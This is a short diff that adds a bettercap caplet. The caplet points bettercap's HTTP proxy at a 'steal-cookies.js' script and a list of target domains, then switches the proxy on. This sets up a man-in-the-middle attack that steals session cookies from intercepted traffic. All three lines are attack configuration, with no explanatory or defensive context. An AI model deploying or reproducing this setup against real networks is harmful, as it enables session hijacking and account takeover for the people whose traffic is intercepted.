@@ -1,0 +1,3 @@
+set steal-cookies.domains /usr/share/bettercap/caplets/steal-cookies/domains.txt
+set http.proxy.script steal-cookies.js
+http.proxy on
